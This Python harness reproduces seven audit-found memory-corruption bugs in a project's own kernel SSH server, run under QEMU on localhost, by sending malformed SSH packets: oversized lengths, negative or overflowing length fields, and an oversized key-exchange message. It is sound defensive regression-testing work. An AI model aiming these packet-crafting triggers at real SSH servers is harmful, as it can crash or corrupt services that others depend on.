#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 cubestudio-dev <cubestudio@qq.com>
"""P0fix1 hostile SSH client -- reproduction harness for BUG-0014..BUG-0020
(kernel sshd memory corruption, audit findings A14-08..A14-14).

Connects to the kernel sshd through QEMU hostfwd (host 127.0.0.1:2223 ->
guest 22). Cases:

  a08_pkt35000  A14-08  pre-auth packet_length=35000 into a 4096B page
  a09_elen_neg  A14-09  KEXDH_INIT e_len = 0xFFFFFFFF (negative)
  a10_ql        A14-10  client KEXINIT name-list length 0x7FFFFFF0
  a11_hashH     A14-11  ~3.4KB client KEXINIT -> sshd exchange-hash overflow
  a12_enc       A14-12  post-NEWKEYS 30000B encrypted packet (paramiko)
  a13_authneg   A14-13  post-NEWKEYS USERAUTH user_len = 0x80000000 (paramiko)
  a14_fail16    A14-14  auth ok + direct-tcpip open -> fail[16] stack overflow
"""
import argparse
import socket
import struct
import sys
import time


def recv_exact(conn, n, timeout=60):
    conn.settimeout(timeout)
    buf = b""
    while len(buf) < n:
        d = conn.recv(n - len(buf))
        if not d:
            break
        buf += d
    return buf


def recv_banner(conn):
    buf = b""
    while b"\r\n" not in buf and len(buf) < 512:
        d = conn.recv(1)
        if not d:
            break
        buf += d
    return buf


def namelist(items):
    return b"".join(struct.pack(">I", len(s)) + s for s in items)


def kexinit_payload(kex_names):
    # cookie must not be all-zero: all-zero bytes get mangled by the kernel
    # TCP receive path (separate bug, not in this P0 batch)
    return b"\x14" + b"\x11" * 16 + namelist(kex_names) + \
        namelist([b"ssh-rsa"]) + namelist([b"aes128-ctr"]) * 2 + \
        namelist([b"hmac-sha2-256"]) * 2 + namelist([b"none"]) * 2 + \
        namelist([b""]) * 2 + b"\x00" + struct.pack(">I", 0)


def send_packet(conn, payload):
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    conn.sendall(struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad)


def read_packet(conn, timeout=60):
    hdr = recv_exact(conn, 4, timeout)
    if len(hdr) < 4:
        return None
    (pkt_len,) = struct.unpack(">I", hdr)
    body = recv_exact(conn, pkt_len, timeout)
    pad = body[0]
    return body[1:pkt_len - pad]


def banner_exchange(conn):
    conn.sendall(b"SSH-2.0-EVILCLIENT\r\n")
    return recv_banner(conn)


def case_a08_pkt35000(conn):
    banner_exchange(conn)
    # kernel sshd waits for the client KEXINIT -- any pre-auth packet with a
    # huge declared length reaches the vulnerable recv path (A14-08)
    conn.sendall(struct.pack(">I", 35000))
    try:
        conn.sendall(b"B" * 35000)
    except BrokenPipeError:
        pass


def kexinit_packet_raw(kex_names):
    """Return a complete SSH packet (already framed)."""
    payload = kexinit_payload(kex_names)
    pad = 8 - ((4 + 1 + len(payload)) % 8)
    if pad < 4:
        pad += 8
    pkt_len = 1 + len(payload) + pad
    return struct.pack(">I", pkt_len) + bytes([pad]) + payload + b"\x00" * pad


def case_a09_elen_neg(conn):
    """Negotiate group14, then KEXDH_INIT with e_len = 0xFFFFFFFF.
    The sshd group14 path does memcpy(client_pub + (256 - el), ed, el) with
    el negative -> wild offset + huge size_t memcpy (A14-09)."""
    banner_exchange(conn)
    # offer ONLY group14 so sshd takes the vulnerable non-curve25519 branch
    conn.sendall(kexinit_packet_raw([b"diffie-hellman-group14-sha256"]))
    read_packet(conn)                       # server KEXINIT (ignored)
    payload = b"\x1e" + struct.pack(">I", 0xFFFFFFFF) + b"\x07" * 32
    send_packet(conn, payload)              # KEXDH_INIT, hostile e_len
    time.sleep(3)


def case_a10_ql(conn):
    banner_exchange(conn)
    # hostile KEXINIT: first name-list length 0x7FFFFFF0 (q+L overflow)
    payload = b"\x14" + b"\x11" * 16 + struct.pack(">I", 0x7FFFFFF0) + \
        b"curve25519-sha256" + namelist([b"ssh-rsa"]) + \
        namelist([b"aes128-ctr"]) * 2 + namelist([b"hmac-sha2-256"]) * 2 + \
        namelist([b"none"]) * 2 + namelist([b""]) * 2 + b"\x00" + struct.pack(">I", 0)
    send_packet(conn, payload)
    time.sleep(3)


def case_a11_hashH(conn):
    banner_exchange(conn)
    big = b"curve25519-sha256" + b"," + b"y" * 3300
    conn.sendall(kexinit_packet_raw([big]))   # ~3.4KB client KEXINIT
    read_packet(conn)                         # server KEXINIT (ignored)
    # valid-shape curve25519 KEXDH_INIT -> sshd computes the exchange hash H
    # whose input now includes the 3.4KB client_kexinit -> page overflow
    payload = b"\x1e" + struct.pack(">I", 32) + b"\x05" * 32
    send_packet(conn, payload)
    time.sleep(3)


def _paramiko_transport(port, timeout=60):
    import paramiko
    t = paramiko.Transport(("127.0.0.1", port))
    t.start_client(timeout=timeout)
    return t


def case_a12_enc(port):
    """post-NEWKEYS huge encrypted packet -> sshd rest_buf/dec_rest/body/mac_input overflow."""
    t = _paramiko_transport(port)
    try:
        from paramiko.message import Message
        payload = b"\x63" + b"\x00" * 30000          # bogus msg id + 30000 bytes
        t.packetizer.send_message(Message(payload))
        print("[evil-client] a12: sent 30000B encrypted message", flush=True)
    finally:
        time.sleep(3)
        try:
            t.close()
        except Exception:  # noqa
            pass


def case_a13_authneg(port):
    """post-NEWKEYS USERAUTH_REQUEST with user_len = 0x80000000."""
    t = _paramiko_transport(port)
    try:
        from paramiko.message import Message
        raw = b"\x32" + struct.pack(">I", 0x80000000) + b"oc" + \
            b"\x00\x00\x00\x0e" + b"ssh-connection" + \
            b"\x00\x00\x00\x08" + b"password" + b"\x00" + \
            b"\x00\x00\x00\x80" + b"\x00" * 8
        t.packetizer.send_message(Message(raw))
        print("[evil-client] a13: sent USERAUTH with user_len=0x80000000", flush=True)
    finally:
        time.sleep(3)
        try:
            t.close()
        except Exception:  # noqa
            pass


def case_a14_fail16(port):
    """Password auth (oc/oc) then open a direct-tcpip channel -> server
    replies CHANNEL_OPEN_FAILURE written into fail[16] (43 bytes)."""
    t = _paramiko_transport(port)
    ok = False
    try:
        t.auth_password("oc", "oc")
        print("[evil-client] a14: auth ok, opening direct-tcpip", flush=True)
        try:
            ch = t.open_channel("direct-tcpip", ("127.0.0.1", 80), ("127.0.0.1", 4444), timeout=30)
            if ch is not None:
                ch.close()
        except Exception as e:  # noqa
            print(f"[evil-client] a14: open_channel rejected as expected: {e!r}", flush=True)
        ok = True
    finally:
        time.sleep(2)
        try:
            t.close()
        except Exception:  # noqa
            pass
    return ok


PLAIN_CASES = {
    "a08_pkt35000": case_a08_pkt35000,
    "a09_elen_neg": case_a09_elen_neg,
    "a10_ql": case_a10_ql,
    "a11_hashH": case_a11_hashH,
}
PK_CASES = {
    "a12_enc": case_a12_enc,
    "a13_authneg": case_a13_authneg,
    "a14_fail16": case_a14_fail16,
}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--case", required=True, choices=sorted(PLAIN_CASES) + sorted(PK_CASES))
    ap.add_argument("--port", type=int, default=2223)
    args = ap.parse_args()

    if args.case in PK_CASES:
        return PK_CASES[args.case](args.port) or 0
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn = socket.create_connection(("127.0.0.1", args.port), timeout=60)
    except Exception as e:  # noqa
        print(f"[evil-client] connect failed: {e!r}", flush=True)
        return 2
    print(f"[evil-client] connected (case {args.case})", flush=True)
    conn.settimeout(120)
    try:
        PLAIN_CASES[args.case](conn)
        print(f"[evil-client] case {args.case} payload sent", flush=True)
    except Exception as e:  # noqa
        print(f"[evil-client] case {args.case} exception: {e!r}", flush=True)
        return 1
    finally:
        try:
            conn.close()
        except Exception:  # noqa
            pass
    return 0


if __name__ == "__main__":
    sys.exit(main())
